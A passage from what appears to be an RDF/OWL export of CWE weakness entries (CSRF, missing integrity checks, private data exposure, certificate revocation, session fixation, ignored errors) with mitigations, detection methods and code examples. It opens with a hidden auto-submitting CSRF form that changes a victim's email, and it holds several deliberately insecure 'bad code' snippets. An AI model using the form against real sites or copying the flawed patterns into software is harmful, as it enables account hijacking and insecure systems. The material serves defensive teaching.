<form action=\"http://victim.example.com/profile.php\" id=\"form\" method=\"post\">
<input type=\"hidden\" name=\"firstname\" value=\"Funny\">
<input type=\"hidden\" name=\"lastname\" value=\"Joke\">
<br/>
<input type=\"hidden\" name=\"email\">
</form>
Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.

Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Web Application Scanner
Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Fuzz Tester
Framework-based Fuzzer
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.
Note: Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed."^^xsd:string, 
                 rdfs:comment "Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.
Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.
Effectiveness: High

Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Bypass Protection Mechanism"^^xsd:string,
     non-repudiation  "DoS: Crash, Exit, or Restart"^^xsd:string,
     non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     non-repudiation  "Modify Application Data"^^xsd:string,
     non-repudiation  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.
Effectiveness: Limited"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     technologies  "Web Server"^^xsd:string
    
    
Individual: CWE-353_Missing_Support_for_Integrity_Check

    Annotations: 
        rdfs:comment "If integrity check values or \"checksums\" are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets."^^xsd:string,
        rdfs:comment "The software uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     
     Annotations: rdfs:comment "Subverting Environment Variable Values"^^xsd:string
                 
                 related_attack_patterns  CAPEC-13,
     
     Annotations: rdfs:comment "Client-side Injection-induced Buffer Overflow"^^xsd:string
                 
                 related_attack_patterns  CAPEC-14,
     related_attack_patterns  CAPEC-389,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     
     Annotations: rdfs:comment "Manipulating User State"^^xsd:string
                 
                 related_attack_patterns  CAPEC-74,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     ID  "353"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Add an appropriately sized checksum to the protocol, ensuring that data received may be simply validated before it is parsed and used."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. In this example, a request packet is received, and privileged information is sent to the requester:

(bad code)
Example Language: Java 
while(true) {
DatagramPacket rp = new DatagramPacket(rData,rData.length);
outSock.receive(rp);
InetAddress IPAddress = rp.getAddress();
int port = rp.getPort();
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);
outSock.send(sp);
}
The response containing secret data has no integrity check associated with it, allowing an attacker to alter the message without detection."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that the checksums present in the protocol design are properly implemented and added to each message before it is sent."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data that is parsed and used may be corrupted."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 non-repudiation  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 other  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Data that is parsed and used may be corrupted."^^xsd:string, 
                 rdfs:comment "Without a checksum it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-354_Improper_Validation_of_Integrity_Check_Value

    Annotations: 
        rdfs:comment "Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences."^^xsd:string,
        rdfs:comment "The software does not validate or incorrectly validates the integrity check values or \"checksums\" of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     related_attack_patterns  CAPEC-145,
     
     Annotations: rdfs:comment "Padding Oracle Crypto Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-463,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     ID  "354"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Integrity checks usually use a secret key that helps authenticate the data origin. Skipping integrity checking generally opens up the possibility that new data from an invalid source can be injected."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following example demonstrates the weakness.

(bad code)
Example Language: C 
sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));
while (1) {

memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);
}
(bad code)
Example Language: Java 
while(true) {
DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);
socket.send(sendPacket);
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that the checksums present in messages are properly checked in accordance with the protocol specification before they are parsed and used."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Data that is parsed and used may be corrupted."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 non-repudiation  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 other  "Hide Activities"^^xsd:string,
     other  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Data that is parsed and used may be corrupted."^^xsd:string, 
                 rdfs:comment "Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-359_Exposure_of_Private_Information

    Annotations: 
        rdfs:comment "Mishandling private information, such as customer passwords or Social Security numbers, can compromise user privacy and is often illegal. An exposure of private information does not necessarily prevent the software from working properly, and in fact it might be intended by the developer, but it can still be undesirable (or explicitly prohibited by law) for the people who are associated with this private information.
Privacy violations may occur when:
1. Private user information enters the program.
2. The data is written to an external location, such as the console, file system, or network.
Private data can enter a program in a variety of ways:
1. Directly from the user in the form of a password or personal information
2. Accessed from a database or other data store by the application
3. Indirectly from a partner or other third party
Some types of private information include:
-Government identifiers, such as Social Security Numbers
-Contact information, such as home addresses and telephone numbers
-Geographic location - where the user is (or was)
-Employment history
-Financial data - such as credit card numbers, salary, bank accounts, and debts
-Pictures, video, or audio
-Behavioral patterns - such as web surfing history, when certain activities are performed, etc.
-Relationships (and types of relationships) with others - family, friends, contacts, etc.
-Communications - e-mail addresses, private e-mail messages, SMS text messages, chat logs, etc.
-Health - medical conditions, insurance status, prescription records
-Credentials, such as passwords, which can be used to access other information.
Some of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry.

Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations: - Safe Harbor Privacy Framework [REF-340] - Gramm-Leach Bliley Act (GLBA) [REF-341] - Health Insurance Portability and Accountability Act (HIPAA) [REF-342] - California SB-1386 [REF-343].

Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.

Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted."^^xsd:string,
        rdfs:comment "The software does not properly prevent private data (such as credit card numbers) from being accessed by actors who either (1) are not explicitly authorized to access the data or (2) do not have the implicit consent of the people to which the data is related."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Evercookie"^^xsd:string
                 
                 related_attack_patterns  CAPEC-464,
     
     Annotations: rdfs:comment "Cross Site Identification"^^xsd:string
                 
                 related_attack_patterns  CAPEC-467,
     ID  "359"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In 2004, an employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [REF-338]. In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated."^^xsd:string, 
                 rdfs:comment "Example 2
The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the getPassword() function returns the user-supplied plaintext password associated with the account.

(bad code)
Example Language: C# 
pass = GetPassword();
...
dbmsLog.WriteLine(id + \":\" + pass + \":\" + type + \":\" + tstamp);
The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern."^^xsd:string, 
                 rdfs:comment "Example 3
This code uses location to determine the user's current US State location.

First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:

Example Language: XML  /* (bad code) */
<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>
During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:

(bad code)
Example Language: Java 
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
deriveStateFromCoords(userCurrLocation);
While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-370_Missing_Check_for_Certificate_Revocation_after_Initial_Check

    Annotations: 
        rdfs:comment "If the revocation status of a certificate is not checked before each action that requires privileges, the system may be subject to a race condition. If a certificate is revoked after the initial check, all subsequent actions taken with the owner of the revoked certificate will lose all benefits guaranteed by the certificate. In fact, it is almost certain that the use of a revoked certificate indicates malicious activity."^^xsd:string,
        rdfs:comment "The software does not check the revocation status of a certificate after its initial revocation check, which can cause the software to perform privileged actions even after the certificate is revoked at a later time."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "Leveraging Race Conditions"^^xsd:string
                 
                 related_attack_patterns  CAPEC-26,
     
     Annotations: rdfs:comment "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions"^^xsd:string
                 
                 related_attack_patterns  CAPEC-29,
     ID  "370"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Trust may be assigned to an entity who is not who it claims to be."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that certificates are checked for revoked status before each use of a protected resource. If the certificate is checked before each access of a protected resource, the delay subject to a possible race condition becomes almost negligible and significantly reduces the risk associated with this issue."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following code checks a certificate before performing an action.

(bad code)
Example Language: C 
if (cert = SSL_get_peer_certificate(ssl)) {
foo=SSL_get_verify_result(ssl);
if (X509_V_OK==foo)

//do stuff 
foo=SSL_get_verify_result(ssl);
//do more stuff without the check. 
While the code performs the certificate verification before each action, it does not check the result of the verification after the initial attempt. The certificate may have been revoked in the time between the privileged actions."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data from an untrusted (and possibly malicious) source may be integrated."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-384_Session_Fixation

    Annotations: 
        rdfs:comment "Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions."^^xsd:string,
        rdfs:comment "Such a scenario is commonly observed when:

1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.
2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.
3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session."^^xsd:string
    
    Types: 
        Compound
    
    Facts:  
     categories_member  CWE-1018_Manage_User_Sessions,
     
     Annotations: rdfs:comment "Session Credential Falsification through Forging"^^xsd:string
                 
                 related_attack_patterns  CAPEC-196,
     
     Annotations: rdfs:comment "Exploitation of Trusted Credentials"^^xsd:string
                 
                 related_attack_patterns  CAPEC-21,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     
     Annotations: rdfs:comment "Reusing Session IDs (aka Session Replay)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-60,
     
     Annotations: rdfs:comment "Session Fixation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-61,
     ID  "384"^^xsd:positiveInteger
    
    
Individual: CWE-390_Detection_of_Error_Condition_Without_Action

    Annotations: 
        rdfs:comment "The software detects a specific error, but takes no actions to handle the error."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     ID  "390"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could utilize an ignored error condition to place the system in an unexpected state that could lead to the execution of unintended logic and could cause other unintended behavior."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed.

(bad code)
Example Language: C 
foo=malloc(sizeof(char)); //the next line checks to see if malloc failed
if (foo==NULL) {
//We do nothing so we just ignore the error.
}
The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate.

Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following example notifies the user that the malloc function did not allocate the required memory resources and returns an error code.

(good code)
Example Language: C 
foo=malloc(sizeof(char)); //the next line checks to see if malloc failed
if (foo==NULL) {
printf(\"Malloc failed to allocate memory resources\");
return -1;
}"^^xsd:string, 
                 rdfs:comment "Example 2. In the following C++ example the method readFile() will read the file whose name is provided in the input parameter and will return the contents of the file in char string. The method calls open() and read() may result in errors if the file does not exist or does not contain any data to read. These errors will be thrown when the is_open() method and good() method indicate errors opening or reading the file. However, these errors are not handled within the catch statement. Catch statements that do not perform any processing will have unexpected results. In this case an empty char string will be returned, and the file will not be properly closed.

(bad code)
Example Language: C++ 
char* readfile (char *filename) {
try {
// open input file
ifstream infile;
infile.open(filename);

if (!infile.is_open()) {
throw \"Unable to open file \" + filename;
}

// get length of file
infile.seekg (0, ios::end);
int length = infile.tellg();
infile.seekg (0, ios::beg);

// allocate memory
char *buffer = new char [length];

// read data from file
infile.read (buffer,length);

if (!infile.good()) {
throw \"Unable to read from file \" + filename;
}

infile.close();

return buffer;
}
catch (...) {
/* bug: insert code to handle this later */
}
}
The catch statement should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following C++ example contains two catch statements. The first of these will catch a specific error thrown within the try block, and the second catch statement will catch all other errors from within the catch block. Both catch statements will notify the user that an error has occurred, close the file, and rethrow to the block that called the readFile() method for further handling or possible termination of the program.

(good code)
Example Language: C++ 
char* readFile (char *filename) {
try {
// open input file
ifstream infile;
infile.open(filename);

if (!infile.is_open()) {
throw \"Unable to open file \" + filename;
}

// get length of file
infile.seekg (0, ios::end);
int length = infile.tellg();
infile.seekg (0, ios::beg);

// allocate memory
char *buffer = new char [length];

// read data from file
infile.read (buffer,length);

if (!infile.good()) {
throw \"Unable to read from file \" + filename;
}
infile.close();

return buffer;
}
catch (char *str) {
printf(\"Error: %s \\n\", str);
infile.close();
throw str;
}
catch (...) {
printf(\"Error occurred trying to read from file \\n\");
infile.close();
throw;
}
}"^^xsd:string, 
                 rdfs:comment "Example 3. In the following Java example the method readFile will read the file whose name is provided in the input parameter and will return the contents of the file in a String object. The constructor of the FileReader object and the read method call may throw exceptions and therefore must be within a try/catch block. While the catch statement in this example will catch thrown exceptions in order for the method to compile, no processing is performed to handle the thrown exceptions. Catch statements that do not perform any processing will have unexpected results. In this case, this will result in the return of a null String.

(bad code)
Example Language: Java 
public String readFile(String filename) {
String retString = null;
try {
// initialize File and FileReader objects
File file = new File(filename);
FileReader fr = new FileReader(file);

// initialize character buffer
long fLen = file.length();
char[] cBuf = new char[(int) fLen];

// read data from file
int iRead = fr.read(cBuf, 0, (int) fLen);

// close file
fr.close();

retString = new String(cBuf);
} catch (Exception ex) {
/* do nothing, but catch so it'll compile... */
}
return retString;
}
The catch statement should contain statements that either attempt to fix the problem, notify the user that an exception has been raised and continue processing, or perform some cleanup and gracefully terminate the program. The following Java example contains three catch statements. The first of these will catch the FileNotFoundException that may be thrown by the FileReader constructor called within the try/catch block. The second catch statement will catch the IOException that may be thrown by the read method called within the try/catch block. The third catch statement will catch all other exceptions thrown within the try block. For all catch statements the user is notified that the exception has been thrown and the exception is rethrown to the block that called the readFile() method for further processing or possible termination of the program. Note that with Java it is usually good practice to use the getMessage() method of the exception class to provide more information to the user about the exception raised.

(good code)
Example Language: Java 
public String readFile(String filename) throws FileNotFoundException, IOException, Exception {
String retString = null;
try {
// initialize File and FileReader objects
File file = new File(filename);
FileReader fr = new FileReader(file);

// initialize character buffer
long fLen = file.length();
char [] cBuf = new char[(int) fLen];

// read data from file
int iRead = fr.read(cBuf, 0, (int) fLen);

// close file
fr.close();

retString = new String(cBuf);
} catch (FileNotFoundException ex) {
System.err.println (\"Error: FileNotFoundException opening the input file: \" + filename );
System.err.println (\"\" + ex.getMessage() );
throw new FileNotFoundException(ex.getMessage());
} catch (IOException ex) {
System.err.println(\"Error: IOException reading the input file.\\n\" + ex.getMessage() );
throw new IOException(ex);
} catch (Exception ex) {
System.err.println(\"Error: Exception reading the input file.\\n\" + ex.getMessage() );
throw new Exception(ex);
}
return retString;
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a function returns an error, it is important to either fix the problem and try again, alert the user that an error has happened and let the program continue, or alert the user and close and cleanup the program."^^xsd:string, 
                 rdfs:comment "Properly handle each exception. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Alter Execution Logic"^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     integrity  "Varies by Context"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Unexpected State"^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     
